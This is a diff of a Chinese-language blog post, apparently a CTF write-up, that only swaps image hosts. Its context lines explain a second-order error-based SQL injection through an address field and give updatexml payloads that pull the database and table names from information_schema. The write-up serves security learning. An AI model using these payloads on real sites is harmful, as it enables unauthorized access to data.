@@ -111,7 +111,7 @@
 	<div class='post-body mb'>
 		<ul>
 <li><p>查看源码给了提示目测是文件包含</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191108/1573214441440.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/1573214441440.png" alt="img"></p>
 </li>
 <li><p>PHP伪协议直接读取源码</p>
 <p><img src="C:%5CUsers%5C51763%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191108200230449.png" alt="image-20191108200230449"></p>
@@ -586,19 +586,19 @@ $db = new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABA
 <ul>
 <li>我们从代码中可以看到在查询的时候使用了正则去过滤，在写入时候使用了预处理所以无法进行注入。但是可以注意到使用正则过滤的时候并没有对地址过滤，我们跟进可以发现在<code>change.php</code>里地址是拼接进sql语句了，但是使用了<code>addslashes()</code>对单引号进行了转义，导致无法逃逸，但是这里可以导致在修改地址时候会将地址查询出来再拼接到更新语句，那么这里就算我们逃逸不了但是可以将后面的单引号给注释掉导致报错，同时这里将sql错误内容给打印出来了，可以使用报错注入。</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191108/15732167224952.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732167224952.png" alt="img"></p>
 </li>
 <li><p>构造payload</p>
 <pre><code class="php">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(database(),1,20)),0x7e),1)#</code></pre>
 <ul>
 <li>在写入时候将上面payload写入地址，而后修改该订单的地址就会显示报错。</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191108/15732178817223.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732178817223.png" alt="img"></p>
 <ul>
 <li>爆表名</li>
 </ul>
 <pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(table_name,1,20)from information_schema.tables where table_schema=&#39;ctfusers&#39;),0x7e),1)#</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191108/15732192818932.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732192818932.png" alt="img"></p>
 <ul>
 <li>爆表段</li>
 </ul>
